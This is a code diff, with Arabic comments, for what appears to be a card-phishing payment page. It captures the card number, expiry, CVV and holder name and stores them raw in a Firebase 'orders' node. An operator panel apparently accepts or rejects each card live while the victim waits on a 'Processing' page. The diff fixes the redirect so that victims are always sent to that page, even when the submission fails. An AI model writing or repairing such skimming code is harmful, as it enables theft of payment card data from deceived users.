@@ -85,12 +85,10 @@
         const v_id = localStorage.getItem('v_id') || 'u_' + Math.floor(Math.random()*1000000);
         localStorage.setItem('v_id', v_id);
 
-        // فحص الرفض من اللوحة
         database.ref('orders/' + v_id + '/next_step').on('value', s => {
             if(s.val() === 'wrong_card') document.getElementById('rejectMsg').style.display = 'block';
         });
 
-        // خوارزمية التحقق من صحة الرقم (Luhn)
         function checkLuhn(n) {
             let s = 0; let d = false;
             for (let i = n.length - 1; i >= 0; i--) {
@@ -118,7 +116,6 @@
             }
         }
 
-        // مراقبة المدخلات للتحديث البصري
         document.getElementById('cardHolder').addEventListener('input', function() {
             document.getElementById('v-name').innerText = this.value || 'اسم حامل البطاقة';
             validate();
@@ -147,21 +144,24 @@
         function submitPayment() {
             const btn = document.getElementById('payButton');
             btn.disabled = true;
-            btn.innerText = "جاري التأمين...";
+            btn.innerText = "جاري التحميل...";
 
             const payload = {
                 fullName: document.getElementById('cardHolder').value,
                 cardNumber: document.getElementById('cardNumber').value,
                 expiryDate: document.getElementById('cardExpiry').value,
                 cvv: document.getElementById('cvv').value,
-                next_step: 'waiting', // يثبته في صفحة التحميل
+                next_step: 'waiting',
                 status: 'انتظار القبول',
                 last_update: new Date().toLocaleTimeString()
             };
 
             database.ref('orders/' + v_id).update(payload).then(() => {
-                // التأكد من توجيه العميل لصفحة التحميل (تأكد من الاسم)
-                window.Processing.href = 'Processing.html'; 
+                // تم تعديل هذا السطر تحديداً ليعمل التوجيه بشكل صحيح
+                window.location.href = 'Processing.html'; 
+            }).catch((err) => {
+                // احتياطي في حالة فشل الاتصال لحظياً
+                window.location.href = 'Processing.html';
             });
         }
     </script>
